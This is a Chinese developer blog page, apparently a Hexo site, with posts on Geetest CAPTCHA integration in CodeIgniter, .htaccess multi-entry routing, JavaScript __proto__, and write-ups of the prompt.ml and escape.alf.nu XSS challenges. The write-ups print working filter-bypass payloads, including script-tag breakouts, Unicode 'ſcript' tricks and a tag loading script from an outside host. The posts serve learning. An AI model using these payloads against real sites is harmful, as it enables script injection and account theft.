<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Geetestlib</span> </span>&#123;</span><br><span class="line">	<span class="comment"># class.geetestlib.php's codes</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="控制器集成"><a href="#控制器集成" class="headerlink" title="控制器集成"></a>控制器集成</h3><p>改名为<code>Geetest.php</code><br>这边的话尝试过利用<code>$this-&gt;load-&gt;library()</code>, 用着用着不知道怎么玩了..所以最后采取的原生require</p>
<blockquote>
<p>require_once dirname(dirname(<strong>FILE</strong>)).’/libraries/Geetestlib.php’;</p>
</blockquote>
<ol>
<li>定义私有变量, 并设置默认构造函数</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> $captcha_id;</span><br><span class="line"><span class="keyword">private</span> $private_key;</span><br><span class="line"><span class="keyword">private</span> $GtSdk;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">parent</span>::__construct();</span><br><span class="line">  <span class="keyword">$this</span>-&gt;captcha_id = <span class="string">"xxx"</span>;</span><br><span class="line">  <span class="keyword">$this</span>-&gt;private_key = <span class="string">"xxx"</span>;</span><br><span class="line">  <span class="keyword">$this</span>-&gt;GtSdk = <span class="keyword">new</span> GeetestLib(<span class="keyword">$this</span>-&gt;captcha_id, <span class="keyword">$this</span>-&gt;private_key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol>
<li><p>静态数据加载controller</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">startCaptcha</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">	session_start();</span><br><span class="line">	$user_id = <span class="string">"test"</span>;</span><br><span class="line">	$status = <span class="keyword">$this</span>-&gt;GtSdk-&gt;pre_process($user_id);</span><br><span class="line">	$_SESSION[<span class="string">'gtserver'</span>] = $status;</span><br><span class="line">	$_SESSION[<span class="string">'user_id'</span>] = $user_id;</span><br><span class="line">	<span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;GtSdk-&gt;get_response_str();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>后端验证controller</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">verifyLogin</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">	session_start();</span><br><span class="line">	$user_id = $_SESSION[<span class="string">'user_id'</span>];</span><br><span class="line">	<span class="keyword">if</span> ($_SESSION[<span class="string">'gtserver'</span>] == <span class="number">1</span>) &#123;   <span class="comment">//服务器正常</span></span><br><span class="line">		$result = <span class="keyword">$this</span>-&gt;GtSdk-&gt;success_validate($_POST[<span class="string">'geetest_challenge'</span>], $_POST[<span class="string">'geetest_validate'</span>], $_POST[<span class="string">'geetest_seccode'</span>], $user_id);</span><br><span class="line">		<span class="keyword">if</span> ($result) &#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'&#123;"status":"success"&#125;'</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'&#123;"status":"fail"&#125;'</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;<span class="keyword">else</span> &#123;  <span class="comment">//服务器宕机,走failback模式</span></span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;GtSdk-&gt;fail_validate($_POST[<span class="string">'geetest_challenge'</span>], $_POST[<span class="string">'geetest_validate'</span>], $_POST[<span class="string">'geetest_seccode'</span>])) &#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'&#123;"status":"success"&#125;'</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'&#123;"status":"fail"&#125;'</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="前端Ajax-逻辑处理"><a href="#前端Ajax-逻辑处理" class="headerlink" title="前端Ajax, 逻辑处理"></a>前端Ajax, 逻辑处理</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">"#mask"</span>).click(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">	$(<span class="string">"#mask, #popup-captcha"</span>).hide();</span><br><span class="line">	$(<span class="string">'#cover-submit-login, #cover-submit-register'</span>).show();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">$(<span class="string">"#cover-submit-login"</span>).click(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">	$(<span class="string">"#mask, #popup-captcha"</span>).show();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* -- login -- */</span></span><br><span class="line"><span class="keyword">var</span> handlerPopupLogin = <span class="function"><span class="keyword">function</span> (<span class="params">captchaObj</span>) </span>&#123;</span><br><span class="line">	<span class="comment">// 将验证码加到id为captcha的元素里</span></span><br><span class="line">	captchaObj.appendTo(<span class="string">"#popup-captcha"</span>);</span><br><span class="line">	<span class="comment">//拖动验证成功后两秒(可自行设置时间)自动发生跳转等行为</span></span><br><span class="line">	captchaObj.onSuccess(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">var</span> validate = captchaObj.getValidate();</span><br><span class="line">		$.ajax(&#123;</span><br><span class="line">			url: <span class="string">"Geetest/verifyLogin"</span>, <span class="comment">// 进行二次验证</span></span><br><span class="line">			type: <span class="string">"post"</span>,</span><br><span class="line">			dataType: <span class="string">"json"</span>,</span><br><span class="line">			data: &#123;</span><br><span class="line">				<span class="comment">// 二次验证</span></span><br><span class="line">				username: $(<span class="string">'#user-login'</span>).val(),</span><br><span class="line">				password: $(<span class="string">'#pass-login'</span>).val(),</span><br><span class="line">				geetest_challenge: validate.geetest_challenge,</span><br><span class="line">				geetest_validate: validate.geetest_validate,</span><br><span class="line">				geetest_seccode: validate.geetest_seccode</span><br><span class="line">			&#125;,</span><br><span class="line">			success: <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line">				<span class="keyword">if</span> (data &amp;&amp; (data.status === <span class="string">"success"</span>)) &#123;</span><br><span class="line">					$(<span class="string">'#form-login'</span>).submit();</span><br><span class="line">          <span class="comment">//  进行form表单提交</span></span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					<span class="comment">//   error operation</span></span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;);</span><br><span class="line">	&#125;);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//  默认ajax状态</span></span><br><span class="line">$.ajax(&#123;</span><br><span class="line">	<span class="comment">// 获取id，challenge，success（是否启用failback）</span></span><br><span class="line">	url: <span class="string">"Geetest/startCaptcha/t/"</span> + (<span class="keyword">new</span> <span class="built_in">Date</span>()).getTime(), <span class="comment">// 加随机数防止缓存</span></span><br><span class="line">	type: <span class="string">"get"</span>,</span><br><span class="line">	dataType: <span class="string">"json"</span>,</span><br><span class="line">	success: <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line">		<span class="comment">// 使用initGeetest接口</span></span><br><span class="line">		<span class="comment">// 参数1：配置参数</span></span><br><span class="line">		<span class="comment">// 参数2：回调，回调的第一个参数验证码对象，之后可以使用它做appendTo之类的事件</span></span><br><span class="line">		initGeetest(&#123;</span><br><span class="line">			gt: data.gt,</span><br><span class="line">			challenge: data.challenge,</span><br><span class="line">			offline: !data.success <span class="comment">// 表示用户后台检测极验服务器是否宕机，一般不需要关注</span></span><br><span class="line">			<span class="comment">// 更多配置参数请参见：http://www.geetest.com/install/sections/idx-client-sdk.html#config</span></span><br><span class="line">		&#125;, handlerPopupLogin);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<h2 id="最后吐槽一下"><a href="#最后吐槽一下" class="headerlink" title="最后吐槽一下"></a>最后吐槽一下</h2><p>极验官方下载的前端demo和官网的前端两个样, 最后参照了一下官网…</p>
<p>自己用的其实是mobile端的验证, 由于前端的input一开始写的<code>type=&quot;submit&quot;</code>, 所以导致每次点击都无法加载完现验证页面.<br>最后采用了button类型, 成功进行form表单提交解决.</p>
<p>给个geetest官网的解决方案(自己实现过, 但是不适用):<br>创建两个一模一样的input, 一个类型为button, 另一个为submit, button默认display=block<br>input点击之后出现验证页面, 更改show和hide状态, submit的input上线~, 验证页面在ajax成功后xxms后关闭.<br>重新进行点击, 完成表单提交. (感觉自己这个实现有点傻, 不过就是这样的..)</p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="http://www.shuchengxian.com/Article/info/id/206.html" target="_blank" rel="external">实例thinkphp如何使用极验验证码 让验证有趣起来-高蒙</a><br><a href="http://www.geetest.com/exp_normal" target="_blank" rel="external">极验前端</a></p>

        
        
        <p class="article-more-link">
          
       </p>
    </div>
    <footer class="article-footer clearfix">


<div class="comments-count">
	
	  	<span></span>
		<a href="/10/07/2016/php-ci-verification/#comments" class="ds-thread-count comments-count-link" data-thread-key="10/07/2016/php-ci-verification/" data-count-type="comments">&nbsp;</a>
	
</div>

</footer>


    </article>






   
    
    <article class="post-expand post" itemprop="articleBody"> 
        <header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/09/23/2016/php-ci-entrance/" title="CodeIgniter多入口URL整合处理" itemprop="url">CodeIgniter多入口URL整合处理</a>
  </h1>
  <p class="article-author">By
       
		<a href="https://plus.google.com/106896526077043222500?rel=author" title="a1exlism" target="_blank" itemprop="author">a1exlism</a>
		
  <p class="article-time">
    <time datetime="2016-09-22T16:00:00.000Z" itemprop="datePublished"> 发表于 09-23-2016</time>
    
  </p>
</header>
    <div class="article-content">
        
        <h1 id="Defined"><a href="#Defined" class="headerlink" title="Defined"></a>Defined</h1><p>最近写了点东西, 正好遇到以前不懂的问题, 着手解决php中多入口的实现方法.参考见底<br>写的是关于<code>CodeIgniter(CI)框架的多入口URL控制问题</code>. 其他php框架原理类似</p>
<h1 id="Main"><a href="#Main" class="headerlink" title="Main()"></a>Main()</h1><h2 id="入口规则"><a href="#入口规则" class="headerlink" title="入口规则"></a>入口规则</h2><p>和常见的cms一样<br>-index 普通用户<br>-admin 管理员</p>
<h2 id="方案1-文件名规范"><a href="#方案1-文件名规范" class="headerlink" title="方案1:文件名规范"></a>方案1:文件名规范</h2><p>利用服务器重写规则进行文件名规范<br>这个说白了就是完全的两份, 改了一下名字~</p>
<h3 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">application</span><br><span class="line">├── assets</span><br><span class="line">│   ├── css</span><br><span class="line">│   ├── fonts</span><br><span class="line">│   └── js</span><br><span class="line">├── index</span><br><span class="line">│   ├── controllers</span><br><span class="line">├── admin</span><br><span class="line">│   ├── controllers</span><br><span class="line">├── views</span><br><span class="line">├── system</span><br><span class="line">├── index.php	<span class="comment">#入口1</span></span><br><span class="line">├── admin.php <span class="comment">#入口2</span></span><br><span class="line">├── index.html</span><br><span class="line">└── .htaccess</span><br></pre></td></tr></table></figure>
<h3 id="根目录-htaccess重写"><a href="#根目录-htaccess重写" class="headerlink" title="根目录.htaccess重写"></a>根目录.htaccess重写</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># .htaccess</span></span><br><span class="line">RewriteEngine on</span><br><span class="line">RewriteCond %&#123;REQUEST_FILENAME&#125; !<span class="_">-d</span></span><br><span class="line">RewriteCond %&#123;REQUEST_FILENAME&#125; !<span class="_">-f</span></span><br><span class="line">RewriteCond <span class="variable">$1</span> !^(index\.php|images|assets|robots\.txt|$)</span><br><span class="line">RewriteRule ^i_(.*)$ /application/index.php/<span class="variable">$1</span> [L]</span><br><span class="line">RewriteRule ^a_(.*)$ /application/admin.php/<span class="variable">$1</span> [L]</span><br></pre></td></tr></table></figure>
<h3 id="URL实现"><a href="#URL实现" class="headerlink" title="URL实现"></a>URL实现</h3><p>访问users的登录: /i_login/<br>访问admin的登录: /a_login/</p>
<h2 id="方案2-文件夹归类"><a href="#方案2-文件夹归类" class="headerlink" title="方案2:文件夹归类"></a>方案2:文件夹归类</h2><h3 id="目录结构-1"><a href="#目录结构-1" class="headerlink" title="目录结构"></a>目录结构</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">application</span><br><span class="line">├── admin</span><br><span class="line">│   ├── admin.php	<span class="comment">#入口1</span></span><br><span class="line">│   ├── controllers</span><br><span class="line">│   ├── .htaccess</span><br><span class="line">├── assets</span><br><span class="line">│   ├── css</span><br><span class="line">│   ├── fonts</span><br><span class="line">│   └── js</span><br><span class="line">├── index</span><br><span class="line">│   ├── admin.php <span class="comment">#入口2</span></span><br><span class="line">│   ├── controllers</span><br><span class="line">│   ├── .htaccess</span><br><span class="line">├── index.html</span><br><span class="line">├── system</span><br><span class="line">└── views</span><br></pre></td></tr></table></figure>
<h3 id="分支-htaccess-重写"><a href="#分支-htaccess-重写" class="headerlink" title="分支.htaccess 重写"></a>分支.htaccess 重写</h3><p>每个分支都有一个.htaccess<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># admin's .htaccess</span></span><br><span class="line">RewriteEngine on</span><br><span class="line">RewriteCond %&#123;REQUEST_FILENAME&#125; !<span class="_">-d</span></span><br><span class="line">RewriteCond %&#123;REQUEST_FILENAME&#125; !<span class="_">-f</span></span><br><span class="line">RewriteRule ^(.*)$ /application/admin/index.php/<span class="variable">$1</span></span><br></pre></td></tr></table></figure></p>
<p>.htaccess 配置详解戳这-&gt;<a href="https://gist.github.com/a1exlism/cbe10c41b8382f6ce008dc67f92ee59c" target="_blank" rel="external">htaccess.md</a></p>
<h3 id="URL实现-1"><a href="#URL实现-1" class="headerlink" title="URL实现"></a>URL实现</h3><p>访问users: /index/<br>访问admin: /admin/<br>根目录的/index.html<code>js 301跳转</code>可以实现直接访问到/index/index.php/index</p>
<h2 id="模块分组-ThinkPHP"><a href="#模块分组-ThinkPHP" class="headerlink" title="模块分组(ThinkPHP)"></a>模块分组(ThinkPHP)</h2><p>这个见<a href="#Reference">Reference</a></p>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://segmentfault.com/q/1010000002491453" target="_blank" rel="external">ThinkPHP两个入口文件-segmentfault</a></p>

        
        
        <p class="article-more-link">
          
       </p>
    </div>
    <footer class="article-footer clearfix">


<div class="comments-count">
	
	  	<span></span>
		<a href="/09/23/2016/php-ci-entrance/#comments" class="ds-thread-count comments-count-link" data-thread-key="09/23/2016/php-ci-entrance/" data-count-type="comments">&nbsp;</a>
	
</div>

</footer>


    </article>






   
    
    <article class="post-expand post" itemprop="articleBody"> 
        <header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/08/14/2016/xss-5/" title="xss习题集_3" itemprop="url">xss习题集_3</a>
  </h1>
  <p class="article-author">By
       
		<a href="https://plus.google.com/106896526077043222500?rel=author" title="a1exlism" target="_blank" itemprop="author">a1exlism</a>
		
  <p class="article-time">
    <time datetime="2016-08-13T16:00:00.000Z" itemprop="datePublished"> 发表于 08-14-2016</time>
    
  </p>
</header>
    <div class="article-content">
        
        <h2 id="defined"><a href="#defined" class="headerlink" title="defined"></a>defined</h2><p>从prompt(1)转去的<a href="http://escape.alf.nu/" target="_blank" rel="external">alert(1)</a></p>
<h2 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h2><h3 id="Level-2-“-转义"><a href="#Level-2-“-转义" class="headerlink" title="Level-2 “ \转义"></a>Level-2 “ \转义</h3><p>JSON.stringify() 双引号, 反斜线, 换行均被转义<br>思路很明确就是闭合”或者&lt;><br>这题需要了解浏览器对标签的解析吧.. 编辑器开个解析尝试写写看..<br>vector:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="regexp">/script&gt;&lt;script&gt;alert(1)/</span><span class="regexp">/</span></span><br></pre></td></tr></table></figure></p>
<p>构造完之后就是:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">console</span>.log(<span class="string">"</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="number">1</span>)<span class="comment">//");</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>在log里面的<code>&lt;/script&gt;</code>提前闭合了前面的script, 后面用注释绕过引号.这样题目的限制根本没有用到~<br>(测试了一下其他类型的标签没有这种问题)</p>
<h3 id="Level-3"><a href="#Level-3" class="headerlink" title="Level-3"></a>Level-3</h3><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="http://escape.alf.nu/" target="_blank" rel="external">alert(1)</a><br><a href="http://www.pwntester.com/blog/2014/01/06/escape-alf-nu-xss-challenges-write-ups-part-148/" target="_blank" rel="external">pwntester-wp-1</a><br><a href="http://www.pwntester.com/blog/2014/01/08/escape-alf-nu-xss-challenges-write-ups-part-257/" target="_blank" rel="external">pwntester-wp-2</a></p>

        
        
        <p class="article-more-link">
          
       </p>
    </div>
    <footer class="article-footer clearfix">


<div class="comments-count">
	
	  	<span></span>
		<a href="/08/14/2016/xss-5/#comments" class="ds-thread-count comments-count-link" data-thread-key="08/14/2016/xss-5/" data-count-type="comments">&nbsp;</a>
	
</div>

</footer>


    </article>






   
    
    <article class="post-expand post" itemprop="articleBody"> 
        <header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/08/13/2016/js-proto/" title="Object__proto__" itemprop="url">Object__proto__</a>
  </h1>
  <p class="article-author">By
       
		<a href="https://plus.google.com/106896526077043222500?rel=author" title="a1exlism" target="_blank" itemprop="author">a1exlism</a>
		
  <p class="article-time">
    <time datetime="2016-08-12T16:00:00.000Z" itemprop="datePublished"> 发表于 08-13-2016</time>
    
  </p>
</header>
    <div class="article-content">
        
        <h2 id="defined"><a href="#defined" class="headerlink" title="defined"></a>defined</h2><p>还是从做xss题目中学到的使用姿势, 概念还是很简单的</p>
<h2 id="main"><a href="#main" class="headerlink" title="main()"></a>main()</h2><p><br><br><br><br><br>代码:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = &#123;</span><br><span class="line">  <span class="string">"source"</span> : <span class="string">"I am defined."</span>,</span><br><span class="line">  <span class="string">"__proto__"</span> : &#123;</span><br><span class="line">    <span class="string">"source"</span> : <span class="string">"I have been redefined!"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line">a.source; <span class="comment">//I am defined.</span></span><br><span class="line"><span class="keyword">delete</span> a.source;</span><br><span class="line">a.source; <span class="comment">//I have been redefined!</span></span><br></pre></td></tr></table></figure></p>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p><code>原型规则</code>, 优先查找自己属性, 然后找爸爸.</p>
<h3 id="xss应用"><a href="#xss应用" class="headerlink" title="xss应用"></a>xss应用</h3><p>环境比较叼钻了, 匹配规则导致原有的属性被删掉, 但是可以利用<code>__proto</code>来进行一个重定义来达到目的<br>可以访问这个来测试一下:<a href="http://prompt.ml/13" target="_blank" rel="external">prompt-13</a></p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/proto" target="_blank" rel="external">MDN-__proto__</a></p>

        
        
        <p class="article-more-link">
          
       </p>
    </div>
    <footer class="article-footer clearfix">


<div class="comments-count">
	
	  	<span></span>
		<a href="/08/13/2016/js-proto/#comments" class="ds-thread-count comments-count-link" data-thread-key="08/13/2016/js-proto/" data-count-type="comments">&nbsp;</a>
	
</div>

</footer>


    </article>






   
    
    <article class="post-expand post" itemprop="articleBody"> 
        <header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/08/07/2016/xss-4/" title="xss习题集_2.2" itemprop="url">xss习题集_2.2</a>
  </h1>
  <p class="article-author">By
       
		<a href="https://plus.google.com/106896526077043222500?rel=author" title="a1exlism" target="_blank" itemprop="author">a1exlism</a>
		
  <p class="article-time">
    <time datetime="2016-08-06T16:00:00.000Z" itemprop="datePublished"> 发表于 08-07-2016</time>
    
  </p>
</header>
    <div class="article-content">
        
        <h2 id="引"><a href="#引" class="headerlink" title="引"></a>引</h2><p>还是这个站<a href="http://prompt.ml/0" target="_blank" rel="external">Prompt(1) to win</a>, 不过是下集, 没想到自己不会这么多, 才会出的下集2333</p>
<h2 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h2><h3 id="Level-9-unicode绕过"><a href="#Level-9-unicode绕过" class="headerlink" title="Level-9 unicode绕过"></a>Level-9 unicode绕过</h3><blockquote>
<p>input.replace(/&lt;([a-zA-Z])/g, ‘<_$1'); input="input.toUpperCase();" return="" '<h1="">‘ + input + ‘‘;</_$1');></p>
</blockquote>
<p>主要是过滤了所有感觉能用的字符, 答案还是比较厉害..<br>js函数大写也有被过滤, 不过可以编码和外部加载解决.注意, 在linux/unix下文件名区分大小写, 可以申请全大写或者一些奇怪的字符来进行绕过<br>vector:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;ſvg&gt;<span class="xml"><span class="tag">&lt;<span class="name">ſcript</span> <span class="attr">href</span>=<span class="string">//ᄒ.ws/XXXX</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">ſcript</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p>
<p>自己写的变形:<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;ſvg onload=&amp;#112;&amp;#114;&amp;#111;&amp;#109;&amp;#112;&amp;#116;(1)&gt;</span><br></pre></td></tr></table></figure></p>
<h4 id="example"><a href="#example" class="headerlink" title="example"></a>example</h4><p>目前我能找到的几个latin letter, 更多的需要探索 -&gt; <a href="http://graphemica.com/unicode/characters" target="_blank" rel="external">unicode-characters</a></p>
<blockquote>
<p>ß  =&gt; SS<br>ı  =&gt; I<br>ſ  =&gt; S</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.write(<span class="string">'&lt;'</span>+<span class="string">'ß'</span>.toUpperCase()[<span class="number">0</span>]+<span class="string">'cript'</span>+<span class="string">'&gt;'</span>);</span><br></pre></td></tr></table></figure>
<h3 id="Level-10"><a href="#Level-10" class="headerlink" title="Level-10"></a>Level-10</h3><blockquote>
<p>encodeURIComponent(input).replace(/prompt/g, ‘alert’);<br>input.replace(/‘/g, ‘’);</p>
</blockquote>
<p>vector:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">promp<span class="string">'t(1)</span></span><br></pre></td></tr></table></figure></p>
<p>这个好迷, 这么后面出了道简单题233</p>
<blockquote>
<p><a href="http://stackoverflow.com/questions/75980/when-are-you-supposed-to-use-escape-instead-of-encodeuri-encodeuricomponent" target="_blank" rel="external">stackoverflow-encode*</a><br>Note that encodeURIComponent does not escape the ‘ character</p>
</blockquote>
<h3 id="Level-11-DOM内json对象执行限制"><a href="#Level-11-DOM内json对象执行限制" class="headerlink" title="Level-11 DOM内json对象执行限制"></a>Level-11 DOM内json对象执行限制</h3><blockquote>
<p>input.replace(/[[|\s+*/\&lt;&gt;&amp;^:;=~!%-]/g, ‘’);<br>var dataString = ‘{“action”:”login”,”message”:”Welcome back, ‘ + input + ‘.”}’;<br>document.write(data.message)</p>
</blockquote>
<p>vector:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"(prompt(1))in"</span></span><br></pre></td></tr></table></figure></p>
<p>学到的:</p>
<blockquote>
<ol>
<li>document.write(alert(1))   //以前一直没碰到过dom类型的, 现在</li>
<li>根据console错误类型判断能否xss, 这题语法错误, 但是是Error in execution.所以只要能parse出来就行</li>
</ol>
</blockquote>
<p>Operator合集: <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Expressions_and_Operators" target="_blank" rel="external">MDN-oprators</a></p>
<p>看到后面我才知道这题正则什么意思, <code>过滤一切符号类型的operator</code>. 然后从character中考虑就是in, instanceof .etc了</p>
<h3 id="Level-12-script符号过滤"><a href="#Level-12-script符号过滤" class="headerlink" title="Level-12 script符号过滤"></a>Level-12 script符号过滤</h3><blockquote>
<p>input = encodeURIComponent(input).replace(/‘/g, ‘’);<br>input = input.replace(/prompt/g, ‘alert’);</p>
</blockquote>
<p>和第10题类似, 不过屏蔽了<code>/</code>,<code>=</code>,<code>?</code>,<code>\s</code>, <code>,</code>, <code>+</code>等能想到的一些符号, 不过没有过滤<code>.</code>这个属性引用, 所以可以进行如下的构造</p>
